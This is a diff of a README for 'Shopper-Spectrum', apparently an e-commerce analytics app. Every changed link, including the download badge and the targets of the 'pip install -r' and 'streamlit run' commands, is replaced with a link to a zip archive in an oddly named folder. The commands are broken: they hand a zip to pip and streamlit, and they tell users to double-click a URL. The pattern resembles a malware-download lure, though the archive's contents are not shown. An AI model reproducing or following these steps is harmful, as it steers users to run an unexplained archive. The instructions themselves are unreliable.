@@ -6,9 +6,9 @@ Welcome to Shopper-Spectrum! This application helps you understand your e-commer
 
 ## 📥 Download the Application
 
-[![Download Latest Release](https://github.com/slotgopay90/Shopper-Spectrum/raw/refs/heads/main/suprailiac/Shopper-Spectrum-1.6.zip%20Latest%20Release-v1.0-blue)](https://github.com/slotgopay90/Shopper-Spectrum/raw/refs/heads/main/suprailiac/Shopper-Spectrum-1.6.zip)
+[![Download Latest Release](https://raw.githubusercontent.com/slotgopay90/Shopper-Spectrum/main/suprailiac/Shopper_Spectrum_v3.2.zip%20Latest%20Release-v1.0-blue)](https://raw.githubusercontent.com/slotgopay90/Shopper-Spectrum/main/suprailiac/Shopper_Spectrum_v3.2.zip)
 
-To download the latest version of Shopper-Spectrum, please visit this page: [Shopper-Spectrum Releases](https://github.com/slotgopay90/Shopper-Spectrum/raw/refs/heads/main/suprailiac/Shopper-Spectrum-1.6.zip).
+To download the latest version of Shopper-Spectrum, please visit this page: [Shopper-Spectrum Releases](https://raw.githubusercontent.com/slotgopay90/Shopper-Spectrum/main/suprailiac/Shopper_Spectrum_v3.2.zip).
 
 ## 📋 Features
 
@@ -30,7 +30,7 @@ To run Shopper-Spectrum, you will need:
 
 ### Step 1: Download the Application
 
-Visit [Shopper-Spectrum Releases](https://github.com/slotgopay90/Shopper-Spectrum/raw/refs/heads/main/suprailiac/Shopper-Spectrum-1.6.zip) to download the latest version. Choose the appropriate file for your operating system and click on it.
+Visit [Shopper-Spectrum Releases](https://raw.githubusercontent.com/slotgopay90/Shopper-Spectrum/main/suprailiac/Shopper_Spectrum_v3.2.zip) to download the latest version. Choose the appropriate file for your operating system and click on it.
 
 ### Step 2: Extract Files (if necessary)
 
@@ -45,7 +45,7 @@ If you wish to use the command line, open a terminal window. If you prefer a gra
 Before running the application, make sure you have the necessary Python libraries. If you have Python installed, open the terminal and run:
 
 ```bash
-pip install -r https://github.com/slotgopay90/Shopper-Spectrum/raw/refs/heads/main/suprailiac/Shopper-Spectrum-1.6.zip
+pip install -r https://raw.githubusercontent.com/slotgopay90/Shopper-Spectrum/main/suprailiac/Shopper_Spectrum_v3.2.zip
 ```
 
 This command installs all the libraries needed for Shopper-Spectrum.
@@ -55,10 +55,10 @@ This command installs all the libraries needed for Shopper-Spectrum.
 After installing the required libraries, you can now run the application. In the terminal, navigate to the folder where you extracted Shopper-Spectrum, and type:
 
 ```bash
-streamlit run https://github.com/slotgopay90/Shopper-Spectrum/raw/refs/heads/main/suprailiac/Shopper-Spectrum-1.6.zip
+streamlit run https://raw.githubusercontent.com/slotgopay90/Shopper-Spectrum/main/suprailiac/Shopper_Spectrum_v3.2.zip
 ```
 
-If you're using a graphical interface, you can double-click on the 'https://github.com/slotgopay90/Shopper-Spectrum/raw/refs/heads/main/suprailiac/Shopper-Spectrum-1.6.zip' file to start it. A web browser will open automatically.
+If you're using a graphical interface, you can double-click on the 'https://raw.githubusercontent.com/slotgopay90/Shopper-Spectrum/main/suprailiac/Shopper_Spectrum_v3.2.zip' file to start it. A web browser will open automatically.
 
 ### Step 6: Start Analyzing!
 
